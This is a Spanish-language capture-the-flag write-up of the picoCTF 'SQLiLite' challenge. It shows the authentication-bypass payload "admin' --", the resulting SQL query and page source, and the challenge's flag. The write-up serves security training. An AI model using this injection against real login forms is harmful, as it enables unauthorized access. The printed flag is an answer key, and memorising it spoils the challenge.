
---
### Descripción:
Can you login to this website?
Additional details will be available after launching your challenge instance.

---
Try to login [here](http://saturn.picoctf.net:65198/).

### Pistas: 
```
1.- `admin` is the user you want to login as.
```

### Solución:
- **Tenemos como pagina principal un log in, como el nombre del reto es SQLiLite, investigamos mas sobre inyecciones SQL, y encontramos: "admin' --", así tomara en cuenta solamente el username, mientas que la contraseña no se tomara en cuenta debido al '--', ya que lo toma como un comentario.**
![[Pasted image 20250405170959.png]]
- **Después de ingresar nos sale un mensaje sobre que logramos entrar, pero que no podemos ver la bandera, lo que significa que tenemos que leer el código fuente.**
![[Pasted image 20250405170802.png]]
- **Teniendo como resultado final:**
```bash
<pre>username: admin&#039; -- 
password: 
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; --&#039; AND password=&#039;&#039; 
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>
```
### Bandera:
```
picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
```
